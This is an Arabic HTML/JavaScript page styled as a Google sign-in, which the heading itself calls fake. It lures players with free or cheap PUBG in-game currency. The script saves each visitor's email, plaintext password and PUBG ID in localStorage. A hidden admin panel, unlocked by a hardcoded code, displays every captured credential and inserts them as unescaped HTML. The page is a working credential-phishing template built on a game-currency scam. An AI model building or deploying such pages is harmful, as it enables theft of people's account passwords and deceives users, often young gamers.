<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>موقع احترافي</title>
<style>
  body {
    background: #0d1b2a;
    color: #e0e0e0;
    font-family: Arial, sans-serif;
    padding: 1rem;
  }
  input, button {
    padding: 0.5rem;
    margin: 0.3rem 0;
    border-radius: 5px;
    border: none;
  }
  button {
    background: #4285f4;
    color: white;
    cursor: pointer;
  }
  #adminPanel {
    background: #222;
    padding: 1rem;
    margin-top: 1rem;
    display: none;
    max-height: 300px;
    overflow-y: auto;
  }
  #adminPanel h3 {
    color: #f33;
  }
</style>
</head>
<body>

<h2>تسجيل الدخول بحساب Google (وهمي)</h2>
<form id="loginForm">
  <input type="email" id="email" placeholder="البريد الإلكتروني" required /><br/>
  <input type="password" id="password" placeholder="كلمة المرور" required /><br/>
  <button type="submit">تسجيل الدخول</button>
</form>

<div id="offers" style="display:none;">
  <h3>عروض شدات ببجي</h3>
  <button onclick="startProcess('1000 مجاني')">1000 شدة - مجاني</button>
  <button onclick="startProcess('2000 - 5 دولار')">2000 شدة - 5 دولار</button>
  <button onclick="startProcess('3000 - 6 دولار')">3000 شدة - 6 دولار</button>
  
  <div id="loading" style="display:none; margin-top: 10px;">
    جاري المعالجة...
    <div style="width: 0; height: 10px; background: lime;" id="loadingBar"></div>
  </div>
  
  <div id="idForm" style="display:none; margin-top: 10px;">
    <input type="text" id="pubgId" placeholder="أدخل ID ببجي" />
    <button onclick="submitID()">موافق</button>
  </div>

  <div id="successMsg" style="display:none; color: lightgreen; margin-top: 10px;">
    تم الشحن بنجاح ✔️
  </div>
</div>

<hr/>

<button onclick="showAdminLogin()">دخول الإدمن</button>

<div id="adminLogin" style="display:none; margin-top:10px;">
  <input type="password" id="adminCode" placeholder="أدخل رمز الإدمن" />
  <button onclick="checkAdmin()">دخول</button>
</div>

<div id="adminPanel">
  <h3>بيانات المستخدمين المسجلة</h3>
  <div id="userDataList"></div>
</div>

<script>
  let selectedOffer = '';

  const loginForm = document.getElementById('loginForm');
  const offersDiv = document.getElementById('offers');
  const loadingDiv = document.getElementById('loading');
  const loadingBar = document.getElementById('loadingBar');
  const idForm = document.getElementById('idForm');
  const successMsg = document.getElementById('successMsg');

  const adminLoginDiv = document.getElementById('adminLogin');
  const adminPanel = document.getElementById('adminPanel');
  const userDataList = document.getElementById('userDataList');

  loginForm.addEventListener('submit', function(e){
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if(email.endsWith('@gmail.com') && password.length >= 6){
      alert('تم تسجيل الدخول بنجاح (محاكاة)');
      offersDiv.style.display = 'block';
    } else {
      alert('يرجى إدخال بيانات صحيحة.');
    }
  });

  function startProcess(offer){
    selectedOffer = offer;
    loadingDiv.style.display = 'block';
    loadingBar.style.width = '0%';
    idForm.style.display = 'none';
    successMsg.style.display = 'none';

    setTimeout(() => {
      loadingBar.style.width = '100%';
    }, 100);

    setTimeout(() => {
      loadingDiv.style.display = 'none';
      idForm.style.display = 'block';
    }, 2100);
  }

  function submitID(){
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const pubgId = document.getElementById('pubgId').value.trim();

    if(pubgId === ''){
      alert('يرجى إدخال ID ببجي صحيح');
      return;
    }

    // حفظ البيانات في localStorage
    let storedData = JSON.parse(localStorage.getItem('userData') || '[]');
    storedData.push({ email, password, pubgId, offer: selectedOffer, date: new Date().toLocaleString() });
    localStorage.setItem('userData', JSON.stringify(storedData));

    idForm.style.display = 'none';
    successMsg.style.display = 'block';
  }

  function showAdminLogin(){
    adminLoginDiv.style.display = 'block';
  }

  function checkAdmin(){
    const code = document.getElementById('adminCode').value.trim();
    if(code === 'حيدرغرام'){
      adminLoginDiv.style.display = 'none';
      showAdminPanel();
    } else {
      alert('رمز الإدمن غير صحيح');
    }
  }

  function showAdminPanel(){
    adminPanel.style.display = 'block';
    const data = JSON.parse(localStorage.getItem('userData') || '[]');
    if(data.length === 0){
      userDataList.innerHTML = '<p>لا توجد بيانات محفوظة.</p>';
      return;
    }
    userDataList.innerHTML = data.map((item, i) => `
      <div style="border-bottom: 1px solid #555; margin-bottom: 5px; padding-bottom: 5px;">
        <strong>#${i+1}</strong> - البريد: ${item.email} - الباسورد: ${item.password} - ID: ${item.pubgId} - العرض: ${item.offer} - الوقت: ${item.date}
      </div>
    `).join('');
  }
</script>

</body>
</html>
